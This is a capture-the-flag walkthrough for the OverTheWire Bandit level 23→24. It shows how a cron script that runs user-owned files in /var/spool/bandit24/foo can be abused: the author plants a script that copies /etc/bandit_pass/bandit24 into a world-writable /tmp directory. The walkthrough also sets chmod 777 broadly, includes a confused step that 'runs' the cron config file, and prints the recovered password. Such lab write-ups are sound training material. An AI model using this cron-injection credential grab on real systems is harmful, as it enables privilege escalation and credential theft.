***A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.***

Same drill as before:

**`bandit23@bandit:~$ cd /etc/cron.d`**  
**`bandit23@bandit:/etc/cron.d$ ls`**  
*`cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root  e2scrub_all  otw-tmp-dir  sysstat`*  
**`bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24`**  
*`@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null`*  
*`* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null`*  
**`bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh`**  
```
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

Looking at the shell script, it appears to execute and then delete all scripts within the specified directory (/var/spool/$myname/foo); again, in this instance, the cron job executes as bandit24, so $myname will also be assigned a value of bandit24. 

**Theoretically, if we can manage to inject our own simple shell script into the directory specified within the cronjob's referenced shell script....**

**`bandit23@bandit:/etc/cron.d$ cd /tmp/rajh`**  
**`bandit23@bandit:/tmp/rajh$ vim raj_bandit24.sh`**  

Within Vim:
```
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/rajh/bandit24_pass
```

**`bandit23@bandit:/tmp/rajh$ chmod 777 raj_bandit24.sh`**  
**`bandit23@bandit:/tmp/rajh$ cp raj_bandit24.sh /var/spool/bandit24/foo`**  

Now that our own shell script has been injected into the target directory, let's trigger the original shell script within the cronjob. But before that, we will need to change the permissions of our temp working directory as well, so that it can be written to by anyone:

**`bandit23@bandit:/tmp/rajh$ chmod 777 /tmp/rajh`**  
**`bandit23@bandit:/tmp/rajh$ cp /etc/cron.d/cronjob_bandit24 /tmp/rajh`**  
**`bandit23@bandit:/tmp/rajh$ chmod 777 cronjob_bandit24`**  
**`bandit23@bandit:/tmp/rajh$ ./cronjob_bandit24`**  

Give the cronjob a minute to run...

**`bandit23@bandit:/tmp/rajh$ ls`**  
*`bandit24_pass  cronjob_bandit24  raj_bandit24.sh`*  
**`bandit23@bandit:/tmp/rajh$ cat bandit24_pass`**  
*`VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar`*
